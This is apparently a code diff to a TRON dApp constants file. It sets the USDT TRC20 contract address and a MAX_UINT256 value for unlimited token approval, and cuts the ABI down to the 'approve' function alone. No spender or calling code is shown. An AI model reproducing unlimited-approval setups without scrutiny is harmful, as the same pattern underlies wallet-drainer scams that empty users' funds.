@@ -57,33 +57,16 @@ export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 // MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
 export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-// TRC20 ABI for approve
+// TRC20 ABI for approve (TronWeb compatible format)
 const TRC20_ABI = [
   {
-    "constant": false,
     "inputs": [
       { "name": "_spender", "type": "address" },
       { "name": "_value", "type": "uint256" }
     ],
     "name": "approve",
     "outputs": [{ "name": "", "type": "bool" }],
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [{ "name": "_owner", "type": "address" }],
-    "name": "balanceOf",
-    "outputs": [{ "name": "balance", "type": "uint256" }],
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [
-      { "name": "_owner", "type": "address" },
-      { "name": "_spender", "type": "address" }
-    ],
-    "name": "allowance",
-    "outputs": [{ "name": "", "type": "uint256" }],
+    "stateMutability": "nonpayable",
     "type": "function"
   }
 ];
